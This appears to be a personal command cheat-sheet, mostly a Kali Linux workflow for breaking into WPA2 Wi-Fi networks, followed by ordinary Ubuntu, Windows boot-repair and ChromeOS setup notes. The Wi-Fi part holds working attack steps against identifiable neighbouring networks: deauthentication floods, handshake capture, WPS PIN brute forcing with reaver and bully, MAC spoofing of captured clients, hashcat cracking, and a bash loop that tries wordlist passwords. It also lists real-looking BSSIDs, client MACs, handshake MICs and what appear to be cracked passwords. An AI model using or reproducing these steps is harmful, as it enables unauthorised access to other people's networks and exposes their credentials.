sudo apt-get install -y ffmpeg pocketsphinx
cd /media/sf_VBoxShared
ffmpeg -ss 0 -t 30 -i silicon-valley-season-5-the-best-of-jian-yang.mp3 -ar 16000 -ac 1 file.flac
pocketsphinx_continuous -infile file.wav 2> pocketsphinx.log > result.txt

# %%
#KALI_WPSPINGETWPA
https://askubuntu.com/questions/120367/how-to-connect-to-wi-fi-ap-through-wps
http://www.stealthcopter.com/blog/2015/03/nexus-7-a-hackers-toolkit-part-2-wps-hacking/
http://kamilslab.com/2016/08/24/how-to-get-the-psk-or-password-of-a-wifi-network-if-you-have-the-wps-pin/
https://forums.hak5.org/topic/39403-table-of-wifi-password-standards/
https://forums.kali.org/showthread.php?27180-How-to-create-multiple-monitors-with-the-newer-airmon-ng

sudo iw dev wlan0 set type monitor
iw wlan0 interface add mon0 type monitor
iw wlan0 interface add mon1 type monitor
iw wlan0 interface add mon2 type monitor

#KALI_INFO_BF3
t A4:91:B1:BA:E1:F9 -70 21 4 0 6 195 WPA2 CCMP PSK TelstraBAE1F9
 C4:71:54:1E:1C:F3 -72 45 3 0 1 130 WPA2 CCMP PSK TP-LINK_1CF4
 34:E8:94:41:6C:A2 -79 5 2 0 6 130 WPA2 CCMP PSK TP-LINK_6CA3
 50:D4:F7:0D:0B:20 -74 0 2 0 2 130 WPA2 CCMP PSK WiFi-0B20
 CE:2D:E0:00:2A:22 -79 1 1 0 6 130 WPA2 CCMP PSK 304@17Poplar-2G
 BC:30:D9:B1:74:73 -75 7 1 0 2 195 WPA2 CCMP PSK TelstraB17471
 34:E8:94:6E:80:12 -79 2 1 0 6 130 WPA2 CCMP PSK TP-LINK_8013


 #OCCOM_777C
 98:DA:C4:23:77:7C -73 38 2 0 9 270 WPA2 CCMP PSK OCCOM_777C
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3
#&& sudo airodump-ng wlan0
sudo mkdir ~/Desktop/CAP

sudo airodump-ng --bssid 98:DA:C4:23:77:7C --write ~/Desktop/CAP/OCCOM_777C wlan0 -c 9
sudo aireplay-ng -a 98:DA:C4:23:77:7C wlan0 --deauth 50

pyrit -r ~/Desktop/CAP/OCCOM_777C-01.cap analyze
cap2hccapx ~/Desktop/CAP/OCCOM_777C-01.cap ~/Desktop/CAP/OCCOM_777C-01.hccapx
cp ~/Desktop/CAP/OCCOM_777C-01.cap /media/root/AC83-92B1
cp ~/Desktop/CAP/OCCOM_777C-01.hccapx /media/root/AC83-92B1
umount /media/root/AC83-92B1
eject /dev/sdb
#GPUHASH.me
#hashcat -m 2500 ~/Desktop/CAP/TP-LINK_0E3B-05.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1
sudo apt-get install libssl-dev libpcap-dev
sudo reaver -i wlan0 -b 98:DA:C4:23:77:7C -c 9 -vv -d 5 -w -K
sudo bully wlan0 -b 98:DA:C4:23:77:7C -e OCCOM_777C -c 9
STMAC.......: 60:F6:77:CE:00:FE (Intel Corporate)
MVr2z1T5eH
AP="OCCOM_777C"
BS="98:DA:C4:23:77:7C"
CH="9"
CF="-01"
USB="/media/root/AC83-92B1"

firefox 192.168.0.1
admin
admin


CE:2D:E0:11:73:7C -64 59 4 0 3 130 WPA2 CCMP PSK 311@19Poplar-2G
AP="311@19Poplar-2G"
BS="CE:2D:E0:11:73:7C"
CH="3"
CF="-04"
USB="/media/root/AC83-92B1"

ESSID.......: 311@19Poplar-2G
  BSSID.......: CE:2D:E0:11:73:7C
  STMAC.......: 68:FE:F7:9D:BC:17 (Apple)
  MIC.........: 62C042594FA1F7EFB201572CAB0080CE
  Handshakes..: 1 (1 authenticated)
fCsayVJas4


66:D1:54:F5:67:92 -72 49 15 0 6 130 WPA2 CCMP PSK 405@17Poplar-2G
AP="405@17Poplar-2G"
BS="66:D1:54:F5:67:92"
CH="6"
CF="-01"
USB="/media/root/AC83-92B1"
  ESSID.......: 405@17Poplar-2G
  BSSID.......: 66:D1:54:F5:67:92
  STMAC.......: 70:C9:4E:2B:7E:CD (LiteonTe)
  MIC.........: 4D2B0862A7AECD8BC8C41CE30599CA4F
  MIC.........: D96292C939F9DC074845356080754EA2
  Handshakes..: 2 (0 authenticated)
ggnWJbw65K


 66:D1:54:35:20:0F -38 90 0 0 8 130 WPA2 CCMP PSK 301@Poplar20-2G
AP="301@Poplar20-2G"
BS="66:D1:54:35:20:0F"
CH="8"
USB="/media/root/AC83-92B1"
capdir="/root/Desktop/CAP/"
wdir="$capdir$AP"
  ESSID.......: 301@Poplar20-2G
  BSSID.......: 66:D1:54:35:20:0F
  STMAC.......: 20:34:FB:F2:4A:E0 (XiaomiCo)
  MIC.........: 4C42FCBD604BDF69270ACB6F6ED7B8A6
  Handshakes..: 2 (1 authenticated)
VRg3btyiRN

APINFO=" E6:8D:8C:B2:93:23 -67 25 4 0 11 130 WPA2 CCMP PSK 409@19Poplar-2G "
APINFO=" 34:E8:94:41:6C:A2 -74 91 2 0 6 130 WPA2 CCMP PSK TP-LINK_6CA3 "
APINFO=" C4:71:54:1E:1C:F3 -72 45 3 0 1 130 WPA2 CCMP PSK TP-LINK_1CF4"

 E4:F4:C6:4D:0E:F4 -72 29 8 0 1 270 WPA2 CCMP PSK daus netgear
 E8:FC:AF:F5:19:38 -79 16 6 0 12 195 WPA2 CCMP PSK NETGEAR65
 FC:EC:DA:F2:46:66 -44 3 3 0 161 360 WPA2 CCMP PSK byd
 80:20:DA:5D:34:0F -60 32 2 0 1 130 WPA2 CCMP PSK OPTUS_5D340C
 F4:6B:EF:7F:33:3C -75 28 2 0 1 130 WPA2 CCMP PSK D-Australia Real Estate 949
 FC:EC:DA:F1:46:66 -28 37 1 0 1 195 WPA2 CCMP PSK byd
 
  
APINFO=" E8:FC:AF:F5:19:38 -79 16 6 0 12 195 WPA2 CCMP PSK NETGEAR65"
APINFO=" E4:F4:C6:4D:0E:F4 -72 29 8 0 1 270 WPA2 CCMP PSK daus netgear "

#opengnometerm4times
gnome-terminal \
--tab -e "AP=\"$(echo $APINFO | awk '{print $11}')\" \
BS=\"$(echo $APINFO | awk '{print $1}')\" \
CH=\"$(echo $APINFO | awk '{print $6}')\" \
USB=\"/media/root/AC83-92B1\" \
capdir=\"/root/Desktop/CAP/\" \
wdir=\"$capdir$AP\" \
echo $BS "
sudo airodump-ng --bssid \"$BS\" --write \"$wdir\" wlan0 -c \"$CH\"" \
--tab -e 'bash -c "export BASH_POST_RC=\"autotest\"; exec bash"' \
--tab -e 'bash -c "export BASH_POST_RC=\"autotest\"; exec bash"' \
--tab -e 'bash -c "export BASH_POST_RC=\"autotest\"; exec bash"'


xterm -e bash -c 'echo foo; exec bash'
xterm -e bash -c 'echo foo; exec bash -c "AP=\"$(echo $APINFO | awk '{print $11}')\" \
BS=\"$(echo $APINFO | awk '{print $1}')\" \
CH=\"$(echo $APINFO | awk '{print $6}')\" \
USB=\"/media/root/AC83-92B1\" \
capdir=\"/root/Desktop/CAP/\" \
wdir=\"$capdir$AP\" \
echo $BS "'

gnome-terminal \
--tab -e 'echo bla' \
--tab -e '' \
--tab -e '' \
--tab -e ''



#MACSPOOFER
SM="52:AB:C8:24:3B:6C"
SM="68:FE:F7:9D:BC:17"
service network-manager stop; sleep 5
ifconfig wlan0 down
macchanger -b "$SM" -a wlan0; sleep 5
ifconfig wlan0 up; sleep 5
service network-manager start

#reaver
reaver -i wlan0 -b "$BS" -K -vvv
bully wlan0 -b "$BS" -d
mdk3 wlan0 a -a "$BS" -m


APINFO="50:D4:F7:41:A7:28 -81 1 1 0 149 1170 WPA2 CCMP PSK WiFi-A726-5G"
AP="$(echo $APINFO | awk '{print $11}')"
BS="$(echo $APINFO | awk '{print $1}')"
CH="$(echo $APINFO | awk '{print $6}')"
USB="/media/root/AC83-92B1"
capdir="/root/Desktop/CAP/"
wdir="$capdir$AP"



#START
#umount "$USB"
#eject /dev/sdb
#rm -fr "$USB"
#xterm
&& sudo airmon-ng check kill
sudo service NetworkManager restart && sudo killall wpa_supplicant && sleep 3
#&& sudo airodump-ng wlan0
#xterm
sudo airodump-ng --bssid "$BS" --write "$wdir" wlan0 -c "$CH"
#xterm
sudo aireplay-ng -a "$BS" wlan0 --deauth 100

#xterm
CF="-18"
cdir="$wdir$CF.cap"
hdir="$wdir$CF.hccapx"
pyrit -r "$wdir-18.cap" analyze

cap2hccapx "$cdir" "$hdir"
cp "$cdir" "$USB"
cp "$hdir" "$USB"
ls "$USB"
umount "$USB"
eject /dev/sdb
GPUHASH.me
https://3wifi.stascorp.com/wpspin

https://wpsfinder.com/wps-pin-generator
https://tosunkaya.com/araclar/wpspin/WPS-Hesapla.TOSUNKAYA-EN.php
https://wpspinleri.blogspot.com/p/wps-default-pin-generator.html
#hashcat -m 2500 ~/Desktop/CAP/311@19Poplar-2G-04.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1


choco install -y opencl-intel-cpu-runtime
cd C:\Users\user\Downloads\hashcat-5.1.0\hashcat64.exe
C:\Users\user\Downloads\hashcat-5.1.0\hashcat64.exe -m 2500 C:\Users\user\Desktop\TP-LINK_F0A8-05.hccapx -o C:\Users\user\Desktop\cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1

KALI_SCRIPT_WPA_SUPLICANT


sudo iw wlan0 set type managed
wlaniface="wlan0"
AP="wlan-ap"
#AP="301@Poplar20-2G"
sudo service networking restart
sudo service NetworkManager restart
sudo rmmod rtl8188eus
sudo modprobe -v rtl8188eus
sudo ifconfig wlan0 down
sudo ip add flush wlan0
sudo ifconfig wlan0 up
sudo rm -f /etc/wpa_supplicant.conf
#nmcli d disconnect $wlaniface
nmcli c down id "$AP"
nmcli c delete id "$AP"
sleep 10
nmcli dev wifi connect "$AP" password "asd67890" ifname wlan0
sudo service networking restart
sudo service NetworkManager restart
nmcli c down id "$AP"
nmcli c delete id "$AP"
sleep 10
nmcli dev wifi connect "wlan-ap" password "" ifname wlan0
sudo service networking restart
sudo service NetworkManager restart
nmcli c down id "wlan-ap"
#nmcli c delete id "$AP"
sleep 10
nmcli dev wifi connect "$AP" password "asd67890" ifname wlan0


wpa_passphrase "301@19Poplar-2G" "qwe12345" | sudo tee /etc/wpa_supplicant.conf
wpa_passphrase "301@Poplar20-2G" "asd67890" | sudo tee /etc/wpa_supplicant.conf
sudo wpa_supplicant -c /etc/wpa_supplicant.conf -i $wlaniface



& sleep 5 & xdotool key Escape

iwconfig wlan0 | grep -nP '(?<=$wlaniface unassociated)'

sudo wpa_supplicant -B -c /etc/wpa_supplicant.conf -i $wlaniface
sudo dhclient $wlaniface
ifconfig $wlaniface

sudo dhclient $wlaniface -r

# %%
#KALIecho2

#!/bin/bash
#./echo2 "pl3" "311@19Poplar-2G" > 31119
input="/root/Desktop/passlist"
input="/root/Desktop/passlist2"
#input="/root/Desktop/pl"
input="/root/Desktop/$1"
wlaniface="wlan0"
AP="301@Poplar20-2G"
AP="310@19Poplar-2G"
AP="401@19Poplar-2G"
AP="301@19Poplar-2G"
AP="301@Poplar20-2G"
AP="601@19Poplar-2G"
AP="311@19Poplar-2G"
AP="$2"
#sudo gedit "$2" &
while IFS="" read -r p || [ -n "$p" ]
do
#printf '%s\n' "$p"
#echo "$line"

echo "
$(date +%d%m%y-%T) $AP $p"
#break
#iw dev wlan0 set type monitor

sudo killall wpa_supplicant
sudo service NetworkManager restart

#iw dev
#ip link set wlan0 up
#iw wlan0 scan
#sleep 5
sudo rm -f /etc/wpa_supplicant.conf
wpa_passphrase "$AP" "$p" >> /etc/wpa_supplicant.conf
cat /etc/wpa_supplicant.conf
wpa_supplicant -i$wlaniface -B -c/etc/wpa_supplicant.conf
#-Dwext
sleep 20
echo ""
iw $wlaniface link
echo ""
test=$(iw $wlaniface link | grep "Not connected.")
#echo "$test"
test2=$(iw $wlaniface link | grep "$AP")
#echo "$test2"

if [ ! -z "$test" ] ; then echo "$p Not the password"
elif [ ! -z "$test2" ] ; then echo "$p is connected 1"

sleep 20
echo ""
iw $wlaniface link
echo ""
test=$(iw $wlaniface link | grep "Not connected.")
#echo "$test"
test2=$(iw $wlaniface link | grep "$AP")
#echo "$test2"

if [ ! -z "$test" ] ; then echo "$p Not the password"
elif [ ! -z "$test2" ] ; then echo "$p is connected 2" ; break
fi

fi




#sleep 5
sudo killall wpa_supplicant
#dhclient wlan0
#ping 8.8.8.8
#(Where wlan0 is wifi adapter and blackMOREOps is SSID)
#(Add Routing manually)
#ip route add default via 10.0.0.138 dev wlan0

done < "$input"

bla() {
nmcli c down id "301@Poplar20-2G"
nmcli c delete id "301@Poplar20-2G"
#sudo killall wpa_supplicant
#sudo modprobe -v 8188eu
sudo dhclient -r wlan0
sudo service networking restart
sudo service NetworkManager restart
sudo ifconfig wlan0 down
sudo ip addr flush wlan0
sudo ifconfig wlan0 up
#iwconfig
#iw wlan0 link
iw dev wlan0 set type monitor


sudo killall wpa_supplicant
sudo service NetworkManager restart
sudo rm -f /etc/wpa_supplicant.conf
wpa_passphrase "301@Poplar20-2G" "asd67890" >> /etc/wpa_supplicant.conf
cat /etc/wpa_supplicant.conf
wpa_supplicant -iwlan0 -B -c/etc/wpa_supplicant.conf
sleep 15
iw wlan0 link
test=$(iw wlan0 link | grep "Not connected.")
echo "$test"
}

# %%
Computer

Windows 10 fix

https://social.technet.microsoft.com/Forums/windows/en-US/6b16586e-574d-4a0b-ad68-aafcc7c599d1/bcdboot-failure-when-attempting-to-copy-boot-files?forum=w7itproinstall
https://www.partitionwizard.com/disk-recovery/0xc0000098.html

Tipsmake.com/bcdboot-command-in-windows
Ultimate guide on how to repaie windows 10
diskpart
select disk 0
list partition
then note the partition number where you installed windows 7.

select partition X (X is the partition number where Windows is installed)
active
exit
bcdbooT c:\windows (if C is your windows partition)
dpkg-returned-an-error-code-1

Method 1: Reconfigure Package Database
The first method you can try is to reconfigure the package database. Probably the database got corrupted while installing a package. Reconfiguring often fixes the problem.

sudo dpkg --configure -a
Method 2: Use force install
If a package installation was interrupted previously, you may try to do a force install.

https://itsfoss.com/dpkg-returned-an-error-code-1/
sudo apt-get install -f
Method 3: Try removing the troublesome package
If it’s not an issue for you, you may try to remove the package manually. Please don’t do it for Linux Kernels (packages starting with linux-).

sudo apt remove
Method 4: Remove post info files of the troublesome package
This should be your last resort. You can try removing the files associated to the package in question from /var/lib/dpkg/info.


You need to know a little about basic Linux commands to figure out what’s happening and how can you use the same with your problem.


 
In my case, I had an issue with polar-bookshelf. So I looked for the files associated with it:

ls -l /var/lib/dpkg/info | grep -i polar-bookshelf
-rw-r--r-- 1 root root 2324811 Aug 14 19:29 polar-bookshelf.list
-rw-r--r-- 1 root root 2822824 Aug 10 04:28 polar-bookshelf.md5sums
-rwxr-xr-x 1 root root 113 Aug 10 04:28 polar-bookshelf.postinst
-rwxr-xr-x 1 root root 84 Aug 10 04:28 polar-bookshelf.postrm
Now all I needed to do was to remove these files:


sudo mv /var/lib/dpkg/info/polar-bookshelf.* /tmp

E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable) [duplicate]

#https://askubuntu.com/questions/1109982/e-could-not-get-lock-var-lib-dpkg-lock-frontend-open-11-resource-temporari
sudo killall apt apt-get
#If none of the above works, remove the lock files. Run in terminal:

sudo rm /var/lib/apt/lists/lock
sudo rm /var/cache/apt/archives/lock
sudo rm /var/lib/dpkg/lock*
#then reconfigure the packages. Run in terminal:

sudo dpkg --configure -a

sudo apt update

debconf: DbDriver ”config“: config.dat is locked by another process: Resource temporarily unavailable” while installing packages

#https://askubuntu.com/questions/136881/debconf-dbdriver-config-config-dat-is-locked-by-another-process-resource-t
#sudo nano /etc/apt/sources.list
sudo apt-get clean
sudo rm /var/cache/debconf/*.dat

#usingfuser
sudo fuser -v /var/cache/debconf/config.dat
#Will show you what process is holding the lock:
#COPY USER PID ACCESS COMMAND
#/var/cache/debconf/config.dat:
# root 18210 F.... dpkg-preconfigu
#Then you simply need to note down the PID and kill it like so:

sudo kill PID
sudo kill -9 PID # if the first doesn't work

E: Sub-process /usr/bin/dpkg returned an error code (1)

#ubuntu errorS

#DPKGLOCK
sudo killall apt apt-get
sudo rm /var/lib/apt/lists/lock
sudo rm /var/cache/apt/archives/lock
sudo rm /var/lib/dpkg/lock*

sudo dpkg --configure -a

sudo apt update

#ubuntu
#linux

#Install PulseEffects
installpulseeffects(){
#Install Flatpak
#To install Flatpak on Ubuntu 18.10 (Cosmic Cuttlefish) or Ubuntu 19.04 (Disco Dingo), simply run:
 sudo apt install flatpak
 
#With older Ubuntu versions, the official Flatpak PPA is the recommended way to install Flatpak. To install it, run the following in a terminal:
 #sudo add-apt-repository ppa:alexlarsson/flatpak
 #sudo apt update
 #sudo apt install flatpak
 
#Install the Software Flatpak plugin
#The Flatpak plugin for the Software app makes it possible to install apps without needing the command line. To install, run:
 sudo apt install gnome-software-plugin-flatpak
 
#Add the Flathub repository
#Flathub is the best place to get Flatpak apps. To enable it, run:
 flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
}

#ubuntu
#linux

# %%
#MonitorMode
#Find Eduroam
#https://andreas-mausch.de/blog/2018/04/30/wifi-monitor-mode/
if $(iwlwifi | grep )
iw dev
iw phy phy0 info
# should show all information about the device, including the "monitor" capability
sudo iw phy phy0 interface add mon0 type monitor
ip link
sudo iw dev wlan0 del
# (I had to replace wlan0 by wlp2s0)
sudo ip link set mon0 up
iw dev mon0 info
sudo iw dev mon0 set freq 2437 # set it to the right channel

#linux
#kali

# %%
#CHROMEOS

#enableintelvtx
font size small
display size small
1440x1200

#CHANGEPASS
https://neverware.zendesk.com/hc/en-us/community/posts/206835307-Root-Administrator-password
ctrl-alt-t
shell
sudo su
chromeos-setdevpasswd
qwerty
qwerty


sudo apt update
sudo apt upgrade -y
sudo apt install -y build-essential
sudo apt install -y curl
#curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
#Stretch
curl -sL https://deb.nodesource.com/setup_9.x | sudo -E bash -
#Buster
#curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -
sudo apt install -y nodejs
sudo apt install -y npm && sudo npm i -g npm
bash <(curl -sL https://raw.githubusercontent.com/node-red/linux-installers/master/deb/update-nodejs-and-nodered)
#sudo npm install -g --unsafe-perm node-red
ip addr | grep "inet 100."
